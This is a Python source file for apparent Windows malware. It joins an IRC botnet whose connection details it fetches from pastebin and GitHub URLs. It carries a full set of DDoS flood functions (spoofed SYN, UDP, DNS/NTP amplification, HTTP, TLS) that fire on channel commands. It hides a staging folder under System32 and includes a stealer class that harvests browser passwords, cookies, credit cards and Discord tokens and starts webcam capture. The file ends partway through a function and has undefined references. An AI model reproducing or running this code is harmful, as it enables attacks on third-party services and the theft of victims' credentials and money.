import aiofiles
import aiohttp
import asyncio
import base64
import colorama
import concurrent.futures
import ctypes
import gzip
import json
import os
import platform
import psutil
import base64
import json
import os
import random
import sqlite3
import platform
import psutil
import socket
import subprocess
import cv2
import threading
import zipfile
import os
import platform
import socket
import subprocess
import psutil
import shutil
import browser_cookie3
import requests
from typing import Union
import requests
import re
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
import pyautogui
import random
import re
import requests
import scapy.all as scapy
import shutil
import socket
import sqlite3
import ssl
import subprocess
import sys
import threading
import time
import urllib.request
import winreg
from aiohttp import FormData
from colorama import Fore
from Crypto.Cipher import AES
from ctypes import wintypes
from OpenSSL import SSL
from pystyle import Add, Center, Anime, Colors, Colorate, Write
from typing import Union
from win32crypt import CryptUnprotectData
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# protector 999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999

def fetch_url(url):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            return response.text.strip()
        else:
            return None
    except requests.RequestException:
        return None

def get_irc_channel():
    primary_url = "https://pastebin.com/raw/txAETwmT"
    fallback_url = "https://raw.githubusercontent.com/247msn/96737693845/refs/heads/main/ircinfo"
    data = fetch_url(primary_url)
    if not data:
        data = fetch_url(fallback_url)
    if data:
        lines = data.split("\n")
        for line in lines:
            if line.startswith("Channel"):
                return line.split(":")[1].strip()
    return None

def get_irc_password():
    primary_url = "https://pastebin.com/raw/txAETwmT"
    fallback_url = "https://raw.githubusercontent.com/247msn/96737693845/refs/heads/main/ircinfo"
    data = fetch_url(primary_url)
    if not data:
        data = fetch_url(fallback_url)
    if data:
        lines = data.split("\n")
        for line in lines:
            if line.startswith("Password"):
                return line.split(":")[1].strip()
    return None

def get_irc_server():
    primary_url = "https://pastebin.com/raw/txAETwmT"
    fallback_url = "https://raw.githubusercontent.com/247msn/96737693845/refs/heads/main/ircinfo"
    data = fetch_url(primary_url)
    if not data:
        data = fetch_url(fallback_url)
    if data:
        lines = data.split("\n")
        for line in lines:
            if line.startswith("Server"):
                return line.split(":")[1].strip()
    return None

webhook = f'{get_webhook()}'

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1",
]

def fetch_url_with_random_user_agent(raw_url, fallback_url):
    user_agent = random.choice(user_agents)
    
    headers = {
        'User-Agent': user_agent,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
    }

    def fetch_url(url):
        req = urllib.request.Request(url, headers=headers)
        try:
            response = urllib.request.urlopen(req)
            if 'gzip' in response.headers.get('Content-Encoding', ''):
                buf = BytesIO(response.read())
                f = gzip.GzipFile(fileobj=buf)
                return f.read().decode('utf-8')
            else:
                return response.read().decode('utf-8')
        except urllib.error.HTTPError as e:
            print(f"HTTP Error: {e.code} - {e.reason}")
            return None
        except Exception as e:
            print(f"Error: {str(e)}")
            return None

    raw_code = fetch_url(raw_url)
    
    if not raw_code:
        print(f"Attempting to fetch from fallback URL...")
        raw_code = fetch_url(fallback_url)
    
    return raw_code

def random_nickname():
    characters = 'abcdefghijklmnopqrstuvwxyz0123456789'
    nickname = f"" + ''.join(random.choices(characters, k=10))
    return nickname

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1",
]

def connect_to_irc(server, port, channel, channel_password):
    nickname = random_nickname()
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    context = SSL.Context(SSL.TLSv1_2_METHOD)
    irc = SSL.Connection(context, sock)

    try:
        irc.connect((server, port))
        print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}]{Fore.GREEN} Connected to HexChat")
        irc.send(f"NICK {nickname}\n".encode("utf-8"))
        time.sleep(1)
        irc.send(f"USER {nickname} 0 * :Bot\n".encode("utf-8"))
        time.sleep(1)
    except Exception as e:
        print(f"Error connecting or registering with IRC server: {e}")
        return None

    try:
        while True:
            response = irc.recv(2048).decode("utf-8")

            if response.startswith("PING"):
                irc.send(f"PONG {response.split()[1]}\n".encode("utf-8"))
            
            elif "Erroneous Nickname" in response:
                print("Retrying with a new nickname.")
                nickname = random_nickname()
                irc.send(f"NICK {nickname}\n".encode("utf-8"))
                irc.send(f"USER {nickname} 0 * :Bot\n".encode("utf-8"))
                time.sleep(1)

            elif "Welcome" in response:
                join_channel(irc, channel, channel_password)
                return irc

    except Exception as e:
        print(f"Error during IRC communication: {e}")
        return None

def join_channel(irc, channel, channel_password):
    try:
        if channel_password:
            irc.send(f"JOIN {channel} {channel_password}\n".encode("utf-8"))
        else:
            irc.send(f"JOIN {channel}\n".encode("utf-8"))
        print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}]{Fore.GREEN} Connected to Botnet IRC")
    except Exception as e:
        print(f"Error joining channel: {e}")

# layer 7

def https_flood(target_url, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            headers = {
                'User-Agent': random.choice(user_agents),
                'Accept-Language': 'en-US,en;q=0.5',
                'Referer': 'https://www.google.com/',
                'Connection': 'keep-alive',
            }
            response = requests.get(target_url, headers=headers, verify=False)
            print(f"Sent HTTPS request to {target_url} with status: {response.status_code}")
            time.sleep(random.uniform(0.01, 0.05))
        except Exception as e:
            print(f"Request failed: {e}")

def http_browser_flood(target_url, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
            }
            requests.get(target_url, headers=headers)
            print(f"HTTP Browser flood request sent to {target_url}")
        except requests.exceptions.RequestException as e:
            print(f"HTTP Browser flood error: {e}")

def http_flood(target_url, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            requests.get(target_url)
            print(f"HTTP flood request sent to {target_url}")
        except requests.exceptions.RequestException as e:
            print(f"HTTP flood error: {e}")

def http_flood_monkey(target_url, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            requests.get(target_url)
            print(f"Monkey flood request sent to {target_url}")
        except requests.exceptions.RequestException as e:
            print(f"Monkey flood error: {e}")

def http_mix_flood(target_url, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
            }
            requests.get(target_url, headers=headers)
            print(f"HTTP Mix flood request sent to {target_url}")
        except requests.exceptions.RequestException as e:
            print(f"HTTP Mix flood error: {e}")

def http_cookie_flood(target_url, duration):
    end_time = time.time() + duration
    cookies = {'session_id': 'fake_session_id'}
    while time.time() < end_time:
        try:
            requests.get(target_url, cookies=cookies)
            print(f"HTTP Cookie flood request sent to {target_url}")
        except requests.exceptions.RequestException as e:
            print(f"HTTP Cookie flood error: {e}")

def ack_flood(target_ip, target_port, duration):
    end_time = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    
    while time.time() < end_time:
        try:
            packet = b'\x00' * 40
            sock.sendto(packet, (target_ip, target_port))
            print(f"ACK flood packet sent to {target_ip}:{target_port}")
        except Exception as e:
            print(f"ACK flood error: {e}")

    sock.close()

def udp_pps_attack(target_ip, target_port, duration):
    end_time = time.time() + duration
    data = random._urandom(1024)
    packet_count = 0
    stop_event = threading.Event()

    def attack():
        nonlocal packet_count
        while not stop_event.is_set():
            if time.time() >= end_time:
                stop_event.set()
                break
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(data, (target_ip, target_port))
                packet_count += 1
                if packet_count % 1000 == 0:
                    print(f"Sent {packet_count} UDP packets to {target_ip}:{target_port}")
            except Exception as e:
                print(f"Error in UDP-PPS attack: {e}")
            finally:
                sock.close()

    threads = []
    for _ in range(200):
        thread = threading.Thread(target=attack)
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    print(f"UDP-PPS attack on {target_ip}:{target_port} completed for {duration} seconds.")

def udp_gbps_attack(target_ip, target_port, duration):
    end_time = time.time() + duration
    data = random._urandom(65507)
    stop_event = threading.Event()

    def attack():
        while not stop_event.is_set():
            if time.time() >= end_time:
                stop_event.set()
                break
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(data, (target_ip, target_port))
                print(f"UDP-GBPS packet sent to {target_ip}:{target_port}")
            except Exception as e:
                print(f"Error in UDP-GBPS attack: {e}")
            finally:
                sock.close()

    threads = []
    for _ in range(200):
        thread = threading.Thread(target=attack)
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    print(f"UDP-GBPS attack on {target_ip}:{target_port} completed for {duration} seconds.")


def dns_amp_attack(target_ip, target_port, duration):
    end_time = time.time() + duration
    dns_query = random._urandom(512)
    stop_event = threading.Event()

    def attack():
        while not stop_event.is_set():
            if time.time() >= end_time:
                stop_event.set()
                break
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(dns_query, (target_ip, target_port))
                print(f"Sent DNS amplification request to {target_ip}:{target_port}")
            except Exception as e:
                print(f"Error in DNS AMP attack: {e}")
            finally:
                sock.close()

    threads = []
    for _ in range(800):
        thread = threading.Thread(target=attack)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    print(f"DNS AMP attack on {target_ip}:{target_port} completed for {duration} seconds.")

def ntp_amp_attack(target_ip, target_port, duration):
    end_time = time.time() + duration
    ntp_request = b'\x17\x00\x03\x2A'
    stop_event = threading.Event()

    def attack():
        while not stop_event.is_set():
            if time.time() >= end_time:
                stop_event.set()
                break
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(ntp_request, (target_ip, target_port))
                print(f"Sent NTP amplification request to {target_ip}:{target_port}")
            except Exception as e:
                print(f"Error in NTP AMP attack: {e}")
            finally:
                sock.close()

    threads = []
    for _ in range(800):
        thread = threading.Thread(target=attack)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    print(f"NTP AMP attack on {target_ip}:{target_port} completed for {duration} seconds.")

def tls_attack(target_ip, target_port, duration):
    end_time = time.time() + duration
    stop_event = threading.Event()

    def attack():
        while not stop_event.is_set():
            if time.time() >= end_time:
                stop_event.set()
                break
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                wrapped_socket = ssl.wrap_socket(sock)
                wrapped_socket.connect((target_ip, target_port))
                wrapped_socket.send(b"GET / HTTP/1.1\r\nHost: " + bytes(target_ip, 'utf-8') + b"\r\n\r\n")
                print(f"TLS connection made to {target_ip}:{target_port}")
            except Exception as e:
                print(f"Error in TLS attack: {e}")
            finally:
                wrapped_socket.close()

    threads = []
    for _ in range(800):
        thread = threading.Thread(target=attack)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    print(f"TLS attack on {target_ip}:{target_port} completed for {duration} seconds.")

def udp_raw_attack(target_ip, target_port, duration):
    end_time = time.time() + duration
    stop_event = threading.Event()
    packet_data = random._urandom(1024)

    def attack():
        while not stop_event.is_set():
            if time.time() >= end_time:
                stop_event.set()
                break
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(packet_data, (target_ip, target_port))
                print(f"UDP Raw packet sent to {target_ip}:{target_port}")
            except Exception as e:
                print(f"Error in UDP Raw attack: {e}")
            finally:
                sock.close()

    threads = []
    for _ in range(5000):
        thread = threading.Thread(target=attack)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    print(f"UDP Raw attack on {target_ip}:{target_port} completed for {duration} seconds.")

def udp_amp_attack(target_ip, target_port, duration):
    end_time = time.time() + duration
    stop_event = threading.Event()
    packet_data = random._urandom(1024)

    def attack():
        while not stop_event.is_set():
            if time.time() >= end_time:
                stop_event.set()
                break
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(packet_data, (target_ip, target_port))
                print(f"Sent amplification packet to {target_ip}:{target_port}")
            except Exception as e:
                print(f"Error in UDP AMP attack: {e}")
            finally:
                sock.close()

    threads = []
    for _ in range(5000):
        thread = threading.Thread(target=attack)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    print(f"UDP AMP attack on {target_ip}:{target_port} completed for {duration} seconds.")

def discord_attack(target_ip, target_port, duration):
    end_time = time.time() + duration
    stop_event = threading.Event()
    data = random._urandom(512)

    def attack():
        while not stop_event.is_set():
            if time.time() >= end_time:
                stop_event.set()
                break
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(data, (target_ip, target_port))
                print(f"Discord call packet sent to {target_ip}:{target_port}")
            except Exception as e:
                print(f"Error in Discord attack: {e}")
            finally:
                sock.close()

    threads = []
    for _ in range(200):
        thread = threading.Thread(target=attack)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    print(f"Discord attack on {target_ip}:{target_port} completed for {duration} seconds.")

def tcp_amp_attack(target_ip, target_port, duration):
    end_time = time.time() + duration
    stop_event = threading.Event()

    def attack():
        while not stop_event.is_set():
            if time.time() >= end_time:
                stop_event.set()
                break
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((target_ip, target_port))
                sock.sendall(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
                sock.recv(4096)
                print(f"TCP Amplification packet sent to {target_ip}:{target_port}")
            except Exception as e:
                print(f"Error in TCP Amplification attack: {e}")
            finally:
                sock.close()

    threads = []
    for _ in range(1000):
        thread = threading.Thread(target=attack)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    print(f"TCP Amplification attack on {target_ip}:{target_port} completed for {duration} seconds.")

def combined_flood(target_ip, target_port, duration):
    end_time = time.time() + duration
    stop_event = threading.Event()

    def tcp_flood():
        while not stop_event.is_set():
            if time.time() >= end_time:
                stop_event.set()
                break
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((target_ip, target_port))
                sock.send(b"GET / HTTP/1.1\r\n")
                sock.close()
                print(f"TCP packet sent to {target_ip}:{target_port}")
            except socket.error as e:
                print(f"TCP flood error: {e}")

    def udp_flood():
        while not stop_event.is_set():
            if time.time() >= end_time:
                stop_event.set()
                break
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(b"A" * 1024, (target_ip, target_port))
                print(f"UDP packet sent to {target_ip}:{target_port}")
            except socket.error as e:
                print(f"UDP flood error: {e}")

    tcp_threads = [threading.Thread(target=tcp_flood) for _ in range(200)]
    udp_threads = [threading.Thread(target=udp_flood) for _ in range(200)]

    for thread in tcp_threads + udp_threads:
        thread.start()
    for thread in tcp_threads + udp_threads:
        thread.join()

    print(f"Combined flood attack on {target_ip}:{target_port} completed for {duration} seconds.")

def tcp_bypass_attack(target_ip, target_port, duration):
    end_time = time.time() + duration
    stop_event = threading.Event()

    def attack():
        while not stop_event.is_set():
            if time.time() >= end_time:
                stop_event.set()
                break
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                sock.connect((target_ip, target_port))
                sock.sendall(b"\x00" * 1024)
                print(f"TCP connection bypass attempt to {target_ip}:{target_port}")
            except Exception as e:
                print(f"Error in TCP Bypass attack: {e}")
            finally:
                sock.close()

    threads = []
    for _ in range(400):
        thread = threading.Thread(target=attack)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    print(f"TCP bypass attack on {target_ip}:{target_port} completed for {duration} seconds.")

def tcp_pure_attack(target_ip, target_port, duration):
    end_time = time.time() + duration
    stop_event = threading.Event()

    def attack():
        while not stop_event.is_set():
            if time.time() >= end_time:
                stop_event.set()
                break
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((target_ip, target_port))
                sock.sendall(b"\xFF" * 4096)
                print(f"TCP Pure packet sent to {target_ip}:{target_port}")
            except Exception as e:
                print(f"Error in TCP Pure attack: {e}")
            finally:
                sock.close()

    threads = []
    for _ in range(500):
        thread = threading.Thread(target=attack)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    print(f"TCP pure attack on {target_ip}:{target_port} completed for {duration} seconds.")



def syn_flood(target_ip, target_port, duration):
    end_time = time.time() + duration
    stop_event = threading.Event()

    def attack():
        while not stop_event.is_set():
            if time.time() >= end_time:
                stop_event.set()
                break
            source_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
            source_port = random.randint(1024, 65535)
            
            ip_packet = scapy.IP(src=source_ip, dst=target_ip)
            tcp_packet = scapy.TCP(sport=source_port, dport=target_port, flags="S")
            packet = ip_packet / tcp_packet

            scapy.send(packet, verbose=0)
            print(f"SYN flood packet sent to {target_ip}:{target_port}")

    threads = []
    for _ in range(1000):
        thread = threading.Thread(target=attack)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    print(f"SYN flood attack on {target_ip}:{target_port} completed for {duration} seconds.")

def handle_messages(irc, channel):
    while True:
        response = irc.recv(2048).decode("utf-8")
        if response.startswith("PING"):
            irc.send(f"PONG {response.split()[1]}\n".encode("utf-8"))
        
        message = ""

        if f"PRIVMSG {channel}" in response:
            user = response.split('!')[0][1:]
            message = response.split(f"PRIVMSG {channel} :")[1].strip()
            print(f"{user}: {message}")
            
            if message.startswith(".https"):
                parts = message.split()
                if len(parts) == 4:
                    _, target_url, port, duration = parts
                    try:
                        duration = int(duration)
                        threads = [threading.Thread(target=https_flood, args=(target_url, duration)) for _ in range(200)]
                        for thread in threads:
                            thread.start()
                        for thread in threads:
                            thread.join()
                    except ValueError:
                        print("ERROR")
                else:
                    print("ERROR")
            
            elif message.startswith(".httpbrowser"):
                parts = message.split()
                if len(parts) == 4:
                    _, target_url, port, duration = parts
                    try:
                        duration = int(duration)
                        threads = [threading.Thread(target=http_browser_flood, args=(target_url, duration)) for _ in range(100000)]
                        for thread in threads:
                            thread.start()
                        for thread in threads:
                            thread.join()
                    except ValueError:
                        print("ERROR")
                else:
                    print("ERROR")

            elif message.startswith(".httpflood"):
                parts = message.split()
                if len(parts) == 4:
                    _, target_url, port, duration = parts
                    try:
                        duration = int(duration)
                        threads = [threading.Thread(target=http_flood, args=(target_url, duration)) for _ in range(1000)]
                        for thread in threads:
                            thread.start()
                        for thread in threads:
                            thread.join()
                    except ValueError:
                        print("ERROR")
                else:
                    print("ERROR")

            elif message.startswith(".httpmix"):
                parts = message.split()
                if len(parts) == 4:
                    _, target_url, port, duration = parts
                    try:
                        duration = int(duration)
                        threads = [threading.Thread(target=http_mix_flood, args=(target_url, duration)) for _ in range(200)]
                        for thread in threads:
                            thread.start()
                        for thread in threads:
                            thread.join()
                    except ValueError:
                        print("ERROR")
                else:
                    print("ERROR")

            elif message.startswith(".httpcookie"):
                parts = message.split()
                if len(parts) == 4:
                    _, target_url, port, duration = parts
                    try:
                        duration = int(duration)
                        threads = [threading.Thread(target=http_cookie_flood, args=(target_url, duration)) for _ in range(200)]
                        for thread in threads:
                            thread.start()
                        for thread in threads:
                            thread.join()
                    except ValueError:
                        print("ERROR")
                else:
                    print("ERROR")

            elif message.startswith(".ack"):
                parts = message.split()
                if len(parts) == 4:
                    _, target_ip, target_port, duration = parts
                    try:
                        target_port = int(target_port)
                        duration = int(duration)
                        threads = [threading.Thread(target=ack_flood, args=(target_ip, target_port, duration)) for _ in range(200)]
                        for thread in threads:
                            thread.start()
                        for thread in threads:
                            thread.join()
                    except ValueError:
                        print("ERROR")
                else:
                    print("ERROR")

            elif message.startswith(".dns-amp"):
                parts = message.split()
                if len(parts) == 4:
                    _, target_ip, target_port, duration = parts
                    try:
                        target_port = int(target_port)
                        duration = int(duration)
                        threads = [threading.Thread(target=dns_amp_attack, args=(target_ip, target_port, duration)) for _ in range(200)]
                        for thread in threads:
                            thread.start()
                        for thread in threads:
                            thread.join()
                    except ValueError:
                        print("ERROR")
                else:
                    print("ERROR")

            elif message.startswith(".ntp-amp"):
                parts = message.split()
                if len(parts) == 4:
                    _, target_ip, target_port, duration = parts
                    try:
                        target_port = int(target_port)
                        duration = int(duration)
                        threads = [threading.Thread(target=ntp_amp_attack, args=(target_ip, target_port, duration)) for _ in range(200)]
                        for thread in threads:
                            thread.start()
                        for thread in threads:
                            thread.join()
                    except ValueError:
                        print("ERROR")
                else:
                    print("ERROR")

            elif message.startswith(".udp-amp"):
                parts = message.split()
                if len(parts) == 4:
                    _, target_ip, target_port, duration = parts
                    try:
                        target_port = int(target_port)
                        duration = int(duration)
                        threads = [threading.Thread(target=udp_amp_attack, args=(target_ip, target_port, duration)) for _ in range(200)]
                        for thread in threads:
                            thread.start()
                        for thread in threads:
                            thread.join()
                    except ValueError:
                        print("ERROR")
                else:
                    print("ERROR")

            elif message.startswith(".udp-raw"):
                parts = message.split()
                if len(parts) == 4:
                    _, target_ip, target_port, duration = parts
                    try:
                        target_port = int(target_port)
                        duration = int(duration)
                        threads = [threading.Thread(target=udp_raw_attack, args=(target_ip, target_port, duration)) for _ in range(200)]
                        for thread in threads:
                            thread.start()
                        for thread in threads:
                            thread.join()
                    except ValueError:
                        print("ERROR")
                else:
                    print("ERROR")

            elif message.startswith(".tcp-amp"):
                parts = message.split()
                if len(parts) == 4:
                    _, target_ip, target_port, duration = parts
                    try:
                        target_port = int(target_port)
                        duration = int(duration)
                        threads = [threading.Thread(target=tcp_amp_attack, args=(target_ip, target_port, duration)) for _ in range(200)]
                        for thread in threads:
                            thread.start()
                        for thread in threads:
                            thread.join()
                    except ValueError:
                        print("ERROR")
                else:
                    print("ERROR")

            elif message.startswith(".tcp-pure"):
                parts = message.split()
                if len(parts) == 4:
                    _, target_ip, target_port, duration = parts
                    try:
                        target_port = int(target_port)
                        duration = int(duration)
                        threads = [threading.Thread(target=tcp_pure_attack, args=(target_ip, target_port, duration)) for _ in range(200)]
                        for thread in threads:
                            thread.start()
                        for thread in threads:
                            thread.join()
                    except ValueError:
                        print("ERROR")
                else:
                    print("ERROR")

            elif message.startswith(".tcp-bypass"):
                parts = message.split()
                if len(parts) == 4:
                    _, target_ip, target_port, duration = parts
                    try:
                        target_port = int(target_port)
                        duration = int(duration)
                        threads = [threading.Thread(target=tcp_bypass_attack, args=(target_ip, target_port, duration)) for _ in range(200)]
                        for thread in threads:
                            thread.start()
                        for thread in threads:
                            thread.join()
                    except ValueError:
                        print("ERROR")
                else:
                    print("ERROR")

            elif message.startswith(".tls"):
                parts = message.split()
                if len(parts) == 4:
                    _, target_ip, target_port, duration = parts
                    try:
                        target_port = int(target_port)
                        duration = int(duration)
                        threads = [threading.Thread(target=tls_attack, args=(target_ip, target_port, duration)) for _ in range(200)]
                        for thread in threads:
                            thread.start()
                        for thread in threads:
                            thread.join()
                    except ValueError:
                        print("ERROR")
                else:
                    print("ERROR")

            elif message.startswith(".udp-pps"):
                parts = message.split()
                if len(parts) == 4:
                    _, target_ip, target_port, duration = parts
                    try:
                        target_port = int(target_port)
                        duration = int(duration)
                        threads = [threading.Thread(target=udp_pps_attack, args=(target_ip, target_port, duration)) for _ in range(200)]
                        for thread in threads:
                            thread.start()
                        for thread in threads:
                            thread.join()
                    except ValueError:
                        print("ERROR")
                else:
                    print("ERROR")

            elif message.startswith(".udp-gbps"):
                parts = message.split()
                if len(parts) == 4:
                    _, target_ip, target_port, duration = parts
                    try:
                        target_port = int(target_port)
                        duration = int(duration)
                        threads = [threading.Thread(target=udp_gbps_attack, args=(target_ip, target_port, duration)) for _ in range(200)]
                        for thread in threads:
                            thread.start()
                        for thread in threads:
                            thread.join()
                    except ValueError:
                        print("ERROR")
                else:
                    print("ERROR")

            elif message.startswith(".discord"):
                parts = message.split()
                if len(parts) == 4:
                    _, target_ip, target_port, duration = parts
                    threading.Thread(target=discord_attack, args=(target_ip, int(target_port), int(duration))).start()

            elif message.startswith(".home"):
                parts = message.split()
                if len(parts) == 4:
                    _, target_ip, target_port, duration = parts
                    try:
                        duration = int(duration)
                        threading.Thread(target=combined_flood, args=(target_ip, int(target_port), duration)).start()
                    except ValueError:
                        print("ERROR")
                else:
                    print("ERROR")

            elif message.startswith(".syn"):
                parts = message.split()
                if len(parts) == 4:
                    _, target_ip, target_port, duration = parts
                    try:
                        target_port = int(target_port)
                        duration = int(duration)
                        threads = [threading.Thread(target=syn_flood, args=(target_ip, target_port, duration)) for _ in range(200)]
                        for thread in threads:
                            thread.start()
                        for thread in threads:
                            thread.join()
                    except ValueError:
                        print("ERROR")
                else:
                    print("ERROR")

import os
import shutil
import subprocess
import requests

# -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

def create_temp_folder():
    temp_folder = os.path.join(os.environ['SystemRoot'], 'System32', '$77', 'Midnight')
    os.makedirs(temp_folder, exist_ok=True)

    os.makedirs(os.path.join(temp_folder, 'Updates'), exist_ok=True)

def compile_temp():
    temp_folder = os.path.join(os.environ['SystemRoot'], 'System32', '$77', 'Midnight')
    archive_name = os.path.join(os.environ['SystemRoot'], 'System32', '$77', 'Midnight.rar')
    subprocess.run(['rar', 'a', archive_name, temp_folder])

# File grabber code to grab abunch of info then at end it has definition for sending it all in one message including gofile link to download or attachment depending on file size.

class InformationGrabber:
    def __init__(self):
        temp_folder = os.path.join(os.environ['SystemRoot'], 'System32', '$77', 'Midnight')
        os.makedirs(os.path.join(temp_folder, 'Browser Credentials'), exist_ok=True)
        os.makedirs(os.path.join(temp_folder, 'Grabbed Files', 'System Information'), exist_ok=True)
        os.makedirs(os.path.join(temp_folder, 'Grabbed Messenger'), exist_ok=True)
        self.browser_credentials_folder = os.path.join(temp_folder, 'Browser Credentials')
        self.baseurl = "https://discord.com/api/v9/users/@me" # discord
        self.regex = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}" # discord
        self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*" # discord
        self.tokens_sent = [] # discord
        self.tokens = [] # discord
        self.ids = [] # discord

        self.appdata = os.getenv('LOCALAPPDATA')
        self.roaming = os.getenv('APPDATA')
        self.browsers = {
            'kometa': self.appdata + '\\Kometa\\User Data',
            'orbitum': self.appdata + '\\Orbitum\\User Data',
            'cent-browser': self.appdata + '\\CentBrowser\\User Data',
            '7star': self.appdata + '\\7Star\\7Star\\User Data',
            'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
            'vivaldi': self.appdata + '\\Vivaldi\\User Data',
            'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
            'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
            'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
            'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'iridium': self.appdata + '\\Iridium\\User Data',
            'opera': self.roaming + '\\Opera Software\\Opera Stable',
            'opera-gx': self.roaming + '\\Opera Software\\Opera GX Stable',
        }

        self.profiles = [
            'Default',
            'Profile 1',
            'Profile 2',
            'Profile 3',
            'Profile 4',
            'Profile 5',
        ]

        def process_browser(name, path, profile, func):
            try:
                func(name, path, profile)
            except Exception:
                pass

        threads = []
        for name, path in self.browsers.items():
            if not os.path.isdir(path):
                continue

            self.masterkey = self.get_master_key(path + '\\Local State')
            self.funcs = [
                self.cookies,
                self.history,
                self.passwords,
                self.credit_cards
            ]

            for profile in self.profiles:
                for func in self.funcs:
                    thread = threading.Thread(target=process_browser, args=(name, path, profile, func))
                    thread.start()
                    threads.append(thread)

        for thread in threads:
            thread.join()

    def capture_webcam_images(self, num_images=1):
        temp_folder = os.path.join(os.environ['SystemRoot'], 'System32', '$77', 'Midnight')
